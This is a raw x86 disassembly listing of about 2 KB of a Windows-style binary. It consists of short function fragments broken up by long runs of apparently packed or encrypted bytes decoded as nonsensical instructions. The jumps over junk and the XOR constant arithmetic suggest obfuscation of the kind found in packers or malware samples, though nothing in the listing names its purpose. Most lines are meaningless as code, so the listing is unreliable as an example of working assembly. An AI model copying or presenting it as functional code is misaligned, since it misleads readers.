  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	bound  ebx,QWORD PTR [eax+0x254781a0]
  404a91:	jle    0x404b11
  404a93:	xchg   ecx,eax
  404a94:	jl     0x404b14
  404a96:	jle    0x404a4d
  404a98:	push   ss
  404a99:	scas   al,BYTE PTR es:[edi]
  404a9a:	mov    ecx,0xd7c8213c
  404a9f:	test   BYTE PTR [eax+0x3bf457c0],dl
  404aa5:	push   0xfffffffe
  404aa7:	push   edi
  404aa8:	adc    DWORD PTR [ecx+0x772282a1],edx
  404aae:	cmp    BYTE PTR [ecx-0x72c3957c],ch
  404ab4:	(bad)  
  404ab5:	stos   BYTE PTR es:[edi],al
  404ab6:	push   es
  404ab7:	and    dh,BYTE PTR ds:0x6147762f
  404abd:	nop
  404abe:	dec    esi
  404abf:	outs   dx,DWORD PTR ds:[esi]
  404ac0:	sti    
  404ac1:	(bad)  
  404ac3:	mov    ch,0x72
  404ac5:	hlt    
  404ac6:	jmp    0x68cf:0x5d38f2ac
  404acd:	jmp    0x404a73
  404acf:	sbb    edx,edx
  404ad1:	mul    DWORD PTR [eax-0x75]
  404ad4:	push   0xffffffd4
  404ad6:	and    esp,DWORD PTR [edx-0x60d1ce9b]
  404adc:	jecxz  0x404b37
  404ade:	pop    ebp
  404adf:	sub    eax,0x19b8395c
  404ae4:	jno    0x404b05
  404ae6:	jg     0x404aa9
  404ae8:	in     eax,dx
  404ae9:	mov    DWORD PTR [ebx+eax*2+0x223f76e1],0xe1498428
  404af4:	push   edi
  404af5:	jne    0x404a8e
  404af7:	push   esi
  404af8:	push   es
  404af9:	mov    ebp,0x30cd3f11
  404afe:	sbb    BYTE PTR [eax],dl
  404b00:	cmp    BYTE PTR [edi+0x2d],ah
  404b03:	js     0x404aa8
  404b05:	jae    0x404afe
  404b07:	pop    esp
  404b08:	or     al,0xda
  404b0a:	sbb    ebx,DWORD PTR [edi-0x41e45e63]
  404b10:	inc    ebx
  404b11:	fnstcw WORD PTR ds:0x4b685bef
  404b17:	mov    al,ds:0x5dc01074
  404b1c:	in     al,dx
  404b1d:	mov    bh,0xe9
  404b1f:	je     0x404b56
  404b21:	jecxz  0x404ad7
  404b23:	xchg   esi,eax
  404b24:	repz jmp 0x78073505
  404b2a:	(bad)  
  404b2b:	push   0xa076462a
  404b30:	ret    0xd4a9
  404b33:	add    DWORD PTR [eax+0x587451d1],0xffffffe5
  404b3a:	or     eax,0xe8a6c24d
  404b3f:	sub    dl,bl
  404b41:	xor    BYTE PTR [edi+0x352a9821],bl
  404b47:	popa   
  404b48:	sbb    eax,0x6715c1ca
  404b4d:	jmp    0xb995578e
  404b52:	out    0xe4,eax
  404b54:	loop   0x404b24
  404b56:	call   DWORD PTR [esi+0x71aa651e]
  404b5c:	shl    ebx,cl
  404b5e:	pushf  
  404b5f:	pushf  
  404b60:	stos   BYTE PTR es:[edi],al
  404b61:	bound  edi,QWORD PTR [edi]
  404b63:	dec    esi
  404b64:	popf   
  404b65:	cmp    bh,bh
  404b67:	sub    ebx,edi
  404b69:	test   al,0x3
  404b6b:	loop   0x404b1e
  404b6d:	xchg   ebx,eax
  404b6e:	add    ah,al
  404b70:	sbb    eax,0xb02dae7a
  404b75:	adc    BYTE PTR [edi+0x5d],ch
  404b78:	inc    ebx
  404b79:	cdq    
  404b7a:	jle    0x404b62
  404b7c:	xor    edx,DWORD PTR [edx+esi*2+0x2443123f]
  404b83:	push   ss
  404b84:	jbe    0x404b82
  404b86:	clc    
  404b87:	in     al,dx
  404b88:	lock dec esi
  404b8a:	pop    ecx
  404b8b:	fwait
  404b8c:	stos   DWORD PTR es:[edi],eax
  404b8d:	push   edx
  404b8e:	cmp    BYTE PTR [edx-0x6a634c37],cl
  404b94:	inc    BYTE PTR [eax+0x25]
  404b97:	cmp    edi,esp
  404b99:	mov    bh,0xd4
  404b9b:	fcmovb st,st(2)
  404b9d:	out    dx,al
  404b9e:	push   eax
  404b9f:	call   0x5ab3eefd
  404ba4:	pop    edi
  404ba5:	(bad)  
  404ba6:	in     eax,dx
  404ba7:	dec    edi
  404ba8:	pop    ecx
  404ba9:	dec    edx
  404baa:	mov    eax,ds:0x84e9dc99
  404baf:	xchg   ebx,eax
  404bb0:	and    BYTE PTR [edi],bh
  404bb2:	pop    ebp
  404bb3:	stos   DWORD PTR es:[edi],eax
  404bb4:	cmc    
  404bb5:	add    al,0xa6
  404bb7:	je     0x404bd1
  404bb9:	cmp    al,0xef
  404bbb:	leave  
  404bbc:	sar    DWORD PTR [ebp+0x43],cl
  404bbf:	imul   ebx,DWORD PTR [edi],0x79020b8f
  404bc5:	jecxz  0x404b85
  404bc7:	rcl    DWORD PTR [edx],cl
  404bc9:	outs   dx,BYTE PTR ds:[esi]
  404bca:	rcl    DWORD PTR [ebx+edi*4-0x13],1
  404bce:	and    DWORD PTR [edx+0x7e],esi
  404bd1:	jbe    0x404c1a
  404bd3:	sar    bh,cl
  404bd5:	sbb    DWORD PTR [ebx+0x16353c8a],0x6c3e850
  404bdf:	xchg   esp,eax
  404be0:	sub    al,0x18
  404be2:	test   eax,0x809181b9
  404be7:	mov    cl,BYTE PTR [ebp-0x17]
  404bea:	loop   0x404b77
  404bec:	xchg   ebp,eax
  404bed:	xor    BYTE PTR [edi+0x40c7ebd2],bh
  404bf3:	stos   DWORD PTR es:[edi],eax
  404bf4:	mov    dl,BYTE PTR [ebx]
  404bf6:	aam    0xfe
  404bf8:	mov    ebp,0x66c4dc3a
  404bfd:	lods   al,BYTE PTR ds:[esi]
  404bfe:	mov    cl,0x2b
  404c00:	add    esp,ebp
  404c02:	rcr    BYTE PTR [eax+edi*1],cl
  404c05:	stc    
  404c06:	jnp    0x404c62
  404c08:	pop    esp
  404c09:	xchg   ebx,eax
  404c0a:	cmp    cl,ch
  404c0c:	les    edx,FWORD PTR [ebx]
  404c0e:	cmp    DWORD PTR [ecx+0x6c638cbc],ebp
  404c14:	jns    0x404c4a
  404c16:	je     0x404bf0
  404c18:	pop    edi
  404c19:	xchg   ebx,eax
  404c1a:	push   0x2e2aa309
  404c1f:	or     eax,0xd9ff7cb
  404c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c25:	add    cl,BYTE PTR ds:0xcf2b2333
  404c2b:	push   esp
  404c2c:	in     eax,0x56
  404c2e:	sar    DWORD PTR [ecx+0x11],cl
  404c31:	retf   0xa6b7
  404c34:	fs push edx
  404c36:	sti    
  404c37:	ds or  dh,ah
  404c3a:	xor    eax,0x8646eaa3
  404c3f:	lock jge 0x404bf7
  404c42:	pop    ecx
  404c43:	rol    DWORD PTR [ecx+0x7c],cl
  404c46:	jg     0x404bdc
  404c48:	shl    dh,cl
  404c4a:	es inc edx
  404c4c:	in     eax,dx
  404c4d:	scas   al,BYTE PTR es:[edi]
  404c4e:	cmp    ebp,ecx
  404c50:	mov    DWORD PTR [ebp+0x147d142f],ebp
  404c56:	ins    BYTE PTR es:[edi],dx
  404c57:	add    edi,DWORD PTR [edx+0x32fde315]
  404c5d:	ss jmp 0x658ad7c1
  404c63:	dec    esp
  404c64:	adc    eax,0xa0cb839d
  404c69:	call   0xe4e3a1c1
  404c6e:	and    al,0x6a
  404c70:	push   eax
  404c71:	cli    
  404c72:	leave  
  404c73:	fxch   st(5)
  404c75:	popa   
  404c76:	sbb    ecx,eax
  404c78:	in     al,0x41
  404c7a:	adc    ebx,DWORD PTR [ecx]
  404c7c:	inc    ebx
  404c7d:	mov    DWORD PTR [ebp+0x53],ebx
  404c80:	xor    DWORD PTR [ebp+0x54c269df],edx
  404c86:	ud1    esp,DWORD PTR [ebp+0x7b69ed96]
  404c8d:	and    eax,0x6c3b3093
  404c92:	ss push 0x5e91980c
  404c98:	adc    cl,al
  404c9a:	inc    edx
  404c9b:	cli    
  404c9c:	ficomp WORD PTR [ebp-0x21d8694a]
  404ca2:	mov    al,0x25
  404ca4:	std    
  404ca5:	xchg   edx,eax
  404ca6:	shr    ah,0x1d
  404ca9:	mov    bl,0x30
  404cab:	mov    dh,ch
  404cad:	xor    ecx,DWORD PTR [eax+0x1c]
  404cb0:	add    ch,ah
  404cb2:	jmp    0x45b1e92
  404cb7:	adc    DWORD PTR [ebx],esp
  404cb9:	mov    ecx,0x8b70a1e3
  404cbe:	add    eax,0x3c87ca1c
  404cc3:	add    al,0x66
  404cc5:	sub    dl,BYTE PTR [edx+eax*2]
  404cc8:	xor    al,0x76
  404cca:	cwde   
  404ccb:	retf   
  404ccc:	push   edi
  404ccd:	ficomp WORD PTR [ebx]
  404ccf:	xor    al,0xb
  404cd1:	(bad)  
  404cd3:	pop    ss
  404cd4:	ins    BYTE PTR es:[edi],dx
  404cd5:	jecxz  0x404c5e
  404cd7:	sub    DWORD PTR [ebx+0x34],esi
  404cda:	test   al,0x97
  404cdc:	add    dl,bl
  404cde:	cmc    
  404cdf:	and    eax,0x735152a1
  404ce4:	push   ds
  404ce5:	jle    0x404d49
  404ce7:	stos   DWORD PTR es:[edi],eax
  404ce8:	jle    0x404cb9
  404cea:	fdivr  QWORD PTR [eax]
  404cec:	sub    edx,DWORD PTR [esi]
  404cee:	out    0xb0,al
  404cf0:	popf   
  404cf1:	jmp    0x404cf0
  404cf3:	loopne 0x404d05
  404cf5:	pop    ecx
  404cf6:	mov    ds:0x4b21ec99,eax
  404cfb:	jle    0x404d4e
  404cfd:	push   cs
  404cfe:	hlt    
  404cff:	xchg   BYTE PTR [ebx+0x1c96f897],al
  404d05:	and    eax,0xe1518996
  404d0a:	sub    dh,BYTE PTR [esi+0x43946b7a]
  404d10:	fild   WORD PTR [eax]
  404d12:	mov    dl,0x0
  404d14:	and    ebx,DWORD PTR [ebx+ecx*8+0x7dc603ab]
  404d1b:	fldln2 
  404d1d:	(bad)  
  404d1e:	repz and BYTE PTR [edi+eax*8],ah
  404d22:	mov    ds:0xf98f0d96,eax
  404d27:	sbb    cl,dl
  404d29:	sbb    eax,0xcb08cbf6
  404d2e:	test   al,0x1
  404d30:	or     ebx,DWORD PTR [ebx+0x79]
  404d33:	sub    ebp,DWORD PTR ds:0x8bf1f71d
  404d39:	dec    ebp
  404d3a:	adc    BYTE PTR [ebx],ah
  404d3c:	enter  0xc981,0x8f
  404d40:	sbb    eax,0xc18b8116
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0x6476bd1f
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404cfb
  404d6a:	adc    DWORD PTR [ebx+0x24],eax
  404d6d:	dec    ebx
  404d6e:	jne    0x404d6e
  404d70:	mov    edx,0x838307
  404d75:	aaa    
  404d76:	jmp    DWORD PTR [edx+0xd]
  404d79:	clc    
  404d7a:	push   0xec4c1d04
  404d7f:	in     al,dx
  404d80:	mov    bl,0x27
  404d82:	dec    eax
  404d83:	inc    edx
  404d84:	fisub  WORD PTR [ecx+0x269a7694]
  404d8a:	xchg   ecx,eax
  404d8b:	call   0x7069:0xa7582971
  404d92:	fucomi st,st(4)
  404d94:	aam    0x50
  404d96:	jns    0x404d66
  404d98:	data16 jge 0x404e0d
  404d9b:	daa    
  404d9c:	leave  
  404d9d:	call   0x93d5:0x8b66
  404da3:	inc    edi
  404da4:	aam    0x1e
  404da6:	jl     0x404d9a
  404da8:	sbb    al,0xff
  404daa:	arpl   WORD PTR [ecx-0x22d79a10],si
  404db0:	dec    ebx
  404db1:	mov    WORD PTR [eax+0x29],es
  404db4:	div    BYTE PTR [eax+0x7a]
  404db7:	lods   eax,DWORD PTR ds:[esi]
  404db8:	pushf  
  404db9:	stos   BYTE PTR es:[edi],al
  404dba:	cs es fcmovbe st,st(5)
  404dbe:	and    BYTE PTR [ebp-0x8],dh
  404dc1:	xlat   BYTE PTR ds:[ebx]
  404dc2:	dec    ebx
  404dc3:	repnz outs dx,DWORD PTR ds:[esi]
  404dc5:	jnp    0x404da4
  404dc7:	fadd   DWORD PTR [edi+0x33fc79c]
  404dcd:	jne    0x404da7
  404dcf:	(bad)  
  404dd0:	and    al,0xe4
  404dd2:	retf   0x1044
  404dd5:	fist   DWORD PTR [eax-0x6ee8a42a]
  404ddb:	dec    eax
  404ddc:	and    eax,0xff215f0e
  404de1:	(bad)  
  404de2:	sbb    al,0xf
  404de4:	dec    eax
  404de5:	in     al,dx
  404de6:	or     DWORD PTR [ebp+ebp*8-0x28],0xffffffc6
  404deb:	mov    WORD PTR [esi-0x392252de],?
  404df1:	pop    esp
  404df2:	lock test eax,0x229da94e
  404df8:	imul   ebp,DWORD PTR [ecx+0xca6be38],0x9be4782a
  404e02:	jge    0x404e73
  404e04:	ins    BYTE PTR es:[edi],dx
  404e05:	cmp    eax,0xffc11969
  404e0a:	in     al,dx
  404e0b:	loopne 0x404e6e
  404e0d:	pop    ss
  404e0e:	scas   eax,DWORD PTR es:[edi]
  404e0f:	adc    BYTE PTR [edx-0x8],bl
  404e12:	mov    cl,0x41
  404e14:	pop    esp
  404e15:	js     0x404de5
  404e17:	retf   
  404e18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e19:	lock call 0x7aee2e97
  404e1f:	jg     0x404e9a
  404e21:	push   cs
  404e22:	jge    0x404e7c
  404e24:	shl    BYTE PTR [ebx],cl
  404e26:	ss test al,0xdf
  404e29:	fiadd  DWORD PTR [edx+0x2c]
  404e2c:	loopne 0x404e4b
  404e2e:	rcl    edi,cl
  404e30:	add    BYTE PTR [ebp-0x67],bh
  404e33:	lahf   
  404e34:	pop    ecx
  404e35:	es push eax
  404e37:	push   ebx
  404e38:	xor    cl,bl
  404e3a:	sub    BYTE PTR [edi],dh
  404e3c:	ret    
  404e3d:	lahf   
  404e3e:	xchg   edi,eax
  404e3f:	scas   al,BYTE PTR es:[edi]
  404e40:	push   ecx
  404e41:	mov    bl,0x85
  404e43:	push   0xef1aed48
  404e48:	out    0x52,al
  404e4a:	push   ss
  404e4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e4c:	xchg   esi,eax
  404e4d:	inc    esi
  404e4e:	push   ds
  404e4f:	in     eax,dx
  404e50:	or     edx,DWORD PTR [ecx]
  404e52:	and    ebx,esp
  404e54:	xlat   BYTE PTR ds:[ebx]
  404e55:	sbb    ecx,esi
  404e57:	out    0xc5,eax
  404e59:	mov    cl,0x11
  404e5b:	mov    ds:0x7b13d830,al
  404e60:	div    BYTE PTR [ebx-0x25d0a75b]
  404e66:	mov    edi,0xc6130cc7
  404e6b:	xor    al,0xf8
  404e6d:	mov    dl,BYTE PTR [ecx+0x54ddf5c5]
  404e73:	nop
  404e74:	ret    
  404e75:	jecxz  0x404e38
  404e77:	jns    0x404e74
  404e79:	stos   BYTE PTR es:[edi],al
  404e7a:	gs push cs
  404e7c:	arpl   WORD PTR [ebx+eax*1-0x518ae2c1],di
  404e83:	cmp    BYTE PTR [ecx+ecx*4],al
  404e86:	bound  ecx,QWORD PTR [eax+eax*1]
  404e89:	fisub  DWORD PTR [ebx]
  404e8b:	cmc    
  404e8c:	mov    ds:0x6b8d136a,al
  404e91:	sbb    al,0x11
  404e93:	push   es
  404e94:	cmp    al,0xc5
  404e96:	jl     0x404efc
  404e98:	fwait
  404e99:	cmc    
  404e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e9b:	add    DWORD PTR [ebp-0x35],ecx
  404e9e:	xchg   ebx,eax
  404e9f:	fmul   DWORD PTR [ebx]
  404ea1:	pop    ds
  404ea2:	call   0xb1ead89a
  404ea7:	push   edx
  404ea8:	pop    edi
  404ea9:	sbb    al,0x85
  404eab:	hlt    
  404eac:	push   ebx
  404ead:	mov    ah,0xfa
  404eaf:	add    DWORD PTR [ebx+0x61b322a0],esp
  404eb5:	arpl   WORD PTR [esi-0x400145cc],bx
  404ebb:	mov    BYTE PTR [ebx-0x7c],bl
  404ebe:	int    0xc
  404ec0:	inc    edi
  404ec1:	push   ss
  404ec2:	pop    esi
  404ec3:	push   cs
  404ec4:	xchg   edi,eax
  404ec5:	iret   
  404ec6:	adc    bh,BYTE PTR [esp+eax*1]
  404ec9:	xor    ah,0xa7
  404ecc:	sub    ecx,DWORD PTR ds:0xfcb6cbbb
  404ed2:	fisubr WORD PTR [edx-0x7a90048c]
  404ed8:	push   ss
  404ed9:	inc    eax
  404eda:	push   edx
  404edb:	pushf  
  404edc:	adc    esi,edi
  404ede:	jne    0x404e78
  404ee0:	and    eax,0xdb11887c
  404ee5:	or     esi,eax
  404ee7:	pop    esp
  404ee8:	call   0x4191:0x158f66b8
  404eef:	test   BYTE PTR [ecx-0x1957d524],bl
  404ef5:	int3   
  404ef6:	(bad)  
  404ef7:	out    dx,eax
  404ef8:	mov    ebp,0x573f17c7
  404efd:	imul   ebp,edx,0xffffffd6
  404f00:	dec    esi
  404f01:	cwde   
  404f02:	xchg   ebx,eax
  404f03:	cld    
  404f04:	adc    ecx,edi
  404f06:	call   0x8c7c6ee2
  404f0b:	fdivr  QWORD PTR [ecx-0xb4fddc7]
  404f11:	jne    0x404f7a
  404f13:	fnstsw WORD PTR ds:0xf23ae523
  404f19:	fimul  DWORD PTR [ebx]
  404f1b:	push   es
  404f1c:	and    edx,DWORD PTR [edx+ecx*4-0x36]
  404f20:	push   ss
  404f21:	sub    al,0x38
  404f23:	test   al,0xa
  404f25:	mov    bl,0x59
  404f27:	push   edx
  404f28:	mov    BYTE PTR [edi],0x32
  404f2b:	sub    ebp,DWORD PTR [eax]
  404f2d:	xlat   BYTE PTR ds:[ebx]
  404f2e:	mov    ebp,0xb839e56c
  404f33:	dec    edx
  404f34:	inc    esi
  404f35:	je     0x404f20
  404f37:	hlt    
  404f38:	sbb    BYTE PTR [eax+edi*8-0x50f04ed5],ah
  404f3f:	push   esi
  404f40:	jo     0x404fb5
  404f42:	rcl    DWORD PTR [edx-0x53de43b7],cl
  404f48:	dec    eax
  404f49:	pusha  
  404f4a:	or     BYTE PTR [edx+edi*8+0x59703528],dl
  404f51:	and    edi,0x21d77956
  404f57:	fistp  WORD PTR [edi+0x51]
  404f5a:	and    DWORD PTR ds:0x4302d9,0x0
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x4302d9
  404f6e:	inc    eax
  404f6f:	mov    ds:0x4302d9,eax
  404f74:	cmp    DWORD PTR ds:0x4302d9,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x4302d9,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e654
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42e91f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42ec57
  404faf:	xor    edx,DWORD PTR ds:0x4302d1
  404fb5:	mov    DWORD PTR ds:0x42ec57,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ece9
  404fc8:	mov    eax,ds:0x42e803
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e658
  404fdc:	sub    ecx,DWORD PTR ds:0x4302cd
  404fe2:	mov    DWORD PTR ds:0x42e658,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42ec73,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42ec73
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42ec73,ecx
  405002:	cmp    DWORD PTR ds:0x42ec73,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e853
  405018:	cmp    DWORD PTR ds:0x42ec73,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42ec73
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42ec73,ecx
  405034:	cmp    DWORD PTR ds:0x42ec73,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	and    dh,BYTE PTR [ebx]
  405054:	int3   
  405055:	stc    
  405056:	(bad)  
  405057:	cs jle 0x4050d8
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	jg     0x4050db
  40505d:	jle    0x405024
  40505f:	xor    BYTE PTR [esp+eax*8-0x51],0x18
  405064:	cmp    BYTE PTR [edx-0x1cc02996],ah
  40506a:	adc    bl,BYTE PTR cs:[esi+0x1d]
  40506e:	add    eax,0xd1ba51c1
  405073:	int    0xf5
  405075:	fs in  al,0x56
  405078:	dec    edi
  405079:	dec    ebx
  40507a:	pusha  
  40507b:	not    DWORD PTR [edi+0x29]
  40507e:	mov    esi,0x715162e4
  405083:	outs   dx,BYTE PTR ds:[esi]
  405084:	fisubr DWORD PTR [ebp+0x22eadca6]
  40508a:	inc    esp
  40508b:	mov    edx,0x6dd8ec99
  405090:	int3   
  405091:	ror    bl,1
  405093:	dec    edx
  405094:	faddp  st(6),st
  405096:	cmc    
  405097:	pushf  
  405098:	or     eax,0xf24691cc
  40509d:	pushw  ds
  40509f:	mov    ds:0xdce545dd,al
  4050a4:	test   DWORD PTR [ecx-0x1bde6e8d],eax
  4050aa:	iret   
  4050ab:	sub    BYTE PTR [ecx-0x5a07e61e],dh
  4050b1:	inc    edi
  4050b2:	pop    eax
  4050b3:	test   BYTE PTR [eax],ah
  4050b5:	add    al,BYTE PTR [edx-0x64]
  4050b8:	in     eax,0xe
  4050ba:	ds xchg esi,eax
  4050bc:	add    esp,DWORD PTR [edi+0x23c7a5bf]
  4050c2:	sub    esp,esp
  4050c4:	(bad)  
  4050c5:	outs   dx,BYTE PTR ds:[esi]
  4050c6:	mov    bl,0x90
  4050c8:	jno    0x40507a
  4050ca:	pusha  
  4050cb:	fistp  QWORD PTR [eax-0x2b743837]
  4050d1:	mov    eax,0x90ed7b8a
  4050d6:	jecxz  0x4050f7
  4050d8:	aad    0x4d
  4050da:	jbe    0x40508a
  4050dc:	das    
  4050dd:	sub    esp,ebp
  4050df:	and    al,BYTE PTR [ecx]
  4050e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050e2:	scas   eax,DWORD PTR es:[edi]
  4050e3:	dec    edx
  4050e4:	stos   BYTE PTR es:[edi],al
  4050e5:	push   ecx
  4050e6:	mov    DWORD PTR [esi],0x3ffe4b32
  4050ec:	dec    eax
  4050ed:	ror    BYTE PTR [ecx-0xdb09e02],0x45
  4050f4:	out    dx,al
  4050f5:	jne    0x40512d
  4050f7:	push   eax
  4050f8:	test   eax,0x44e6457e
  4050fd:	fistp  QWORD PTR [eax-0x2ea1bae2]
  405103:	(bad)  
  405105:	inc    ebx
  405106:	xor    DWORD PTR [edx+0x2d],eax
  405109:	mov    ds:0xa704ea9b,al
  40510e:	pop    ss
  40510f:	mov    al,ds:0xc142b023
  405114:	out    0x6c,al
  405116:	stos   DWORD PTR es:[edi],eax
  405117:	or     DWORD PTR [edx-0x6d27cb33],esp
  40511d:	imul   ecx,DWORD PTR [ecx-0x7d],0x9867c9c9
  405124:	or     BYTE PTR fs:[eax-0x6f76916b],ch
  40512b:	aad    0x2b
  40512d:	mov    esp,0x53a2750
  405132:	mov    DWORD PTR [ecx+0x2a],ebx
  405135:	cmp    al,0x4e
  405137:	fisttp WORD PTR [esi-0x5a53d9bf]
  40513d:	fild   WORD PTR [eax-0x25788a18]
  405143:	lea    ecx,[esi-0x61cb5687]
  405149:	leave  
  40514a:	popa   
  40514b:	js     0x4051c3
  40514d:	fiadd  WORD PTR [ebp+0x5f]
  405150:	rcl    edx,0x1c
  405153:	adc    al,0xbe
  405155:	jb     0x405115
  405157:	dec    eax
  405158:	xor    DWORD PTR [esi],ebp
  40515a:	lea    edi,[ebx]
  40515c:	retf   0x85f4
  40515f:	push   es
  405160:	and    dl,BYTE PTR [edx-0x32]
  405163:	mov    BYTE PTR [edi],cl
  405165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405167:	lahf   
  405168:	push   ecx
  405169:	cmp    DWORD PTR fs:[edx],esp
  40516c:	jne    0x4050ee
  40516e:	popa   
  40516f:	pop    ds
  405170:	cmp    BYTE PTR [edx-0xb39794f],0xc
  405177:	out    0x74,al
  405179:	push   esi
  40517a:	jp     0x4051a2
  40517c:	scas   al,BYTE PTR es:[edi]
  40517d:	pushf  
  40517e:	loop   0x4051db
  405180:	dec    eax
  405181:	test   BYTE PTR [eax],ah
  405183:	dec    esi
  405184:	jnp    0x405183
  405186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405187:	pop    esp
  405188:	add    DWORD PTR [edi+0x31296d11],edx
  40518e:	bound  ebx,QWORD PTR [ecx]
  405190:	(bad)  
  405191:	arpl   bp,cx
  405193:	mov    dh,0xde
  405195:	mov    dl,0x5e
  405197:	js     0x405122
  405199:	mov    edx,0xf9e3902d
  40519e:	stos   BYTE PTR es:[edi],al
  40519f:	inc    ebx
  4051a0:	dec    edi
  4051a1:	scas   eax,DWORD PTR es:[edi]
  4051a2:	aad    0x42
  4051a4:	test   DWORD PTR [esi],edx
  4051a6:	loop   0x405207
  4051a8:	ret    0xe94f
  4051ab:	or     eax,0x1e002554
  4051b0:	push   es
  4051b1:	cli    
  4051b2:	add    dh,BYTE PTR [edx]
  4051b4:	shl    DWORD PTR [edx+0x53],cl
  4051b7:	sub    eax,0xf50846e4
  4051bc:	push   es
  4051bd:	test   BYTE PTR [edi+0x40],bl
  4051c0:	(bad)  
  4051c1:	loopne 0x4051b8
  4051c3:	stos   BYTE PTR es:[edi],al
  4051c4:	xchg   edx,eax
  4051c5:	sar    DWORD PTR [edx+0x3808a752],cl
  4051cb:	je     0x405213
  4051cd:	je     0x405209
  4051cf:	and    eax,0xd3ae8708
  4051d4:	push   eax
  4051d5:	jg     0x4051ac
  4051d7:	test   al,0x8a
  4051d9:	data16 xor al,BYTE PTR [ebp-0xf]
  4051dd:	addr16 cli 
  4051df:	mov    al,ds:0xf7b66028
  4051e4:	xlat   BYTE PTR ds:[ebx]
  4051e5:	and    DWORD PTR [edi+0x72dc8d43],eax
  4051eb:	fild   WORD PTR [esi]
  4051ed:	outs   dx,DWORD PTR ds:[esi]
  4051ee:	imul   ebx,DWORD PTR [ebp+0x5f],0x63
  4051f2:	clc    
  4051f3:	loope  0x40525a
  4051f5:	ret    0x5c0a
  4051f8:	lods   eax,DWORD PTR ds:[esi]
  4051f9:	outs   dx,BYTE PTR ds:[esi]
  4051fa:	ins    BYTE PTR es:[edi],dx
  4051fb:	test   DWORD PTR [eax+0x24147d71],edx
  405201:	icebp  
  405202:	pop    ebx
  405203:	push   ds
  405204:	xchg   esi,eax
  405205:	sbb    al,0xd3
  405207:	loopne 0x40526c
  405209:	cmp    eax,0x313875cb
  40520e:	xchg   ecx,eax
  40520f:	cmp    BYTE PTR [edx+0x350e24e7],0xfd
  405216:	cdq    
  405217:	xchg   edx,eax
  405218:	push   0x64
  40521a:	jae    0x405251
  40521c:	mov    ebp,DWORD PTR [eax+0x1d]
  40521f:	(bad)  
  405220:	addr16 and eax,0xf954315c
  405226:	leave  
  405227:	inc    eax
  405228:	adc    ch,0xee
  40522b:	add    al,0xfa
  40522d:	cmp    eax,0x1ca34495
  405232:	push   ecx
  405233:	je     0x405257
  405235:	jns    0x4051bc
  405237:	lds    esi,FWORD PTR [edx]
  405239:	or     al,0x6
  40523b:	mov    dl,0xd
  40523d:	leave  
  40523e:	bound  ebx,QWORD PTR [ebp+0x2]
  405241:	popa   
  405242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405243:	arpl   WORD PTR [ecx+0x54],sp
  405246:	mov    ch,0x65
  405248:	sbb    ebx,DWORD PTR [eax+0x60]
  40524b:	jecxz  0x405237
  40524d:	je     0x405208
  40524f:	push   esp
  405250:	or     BYTE PTR [ecx+0x7],dl
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
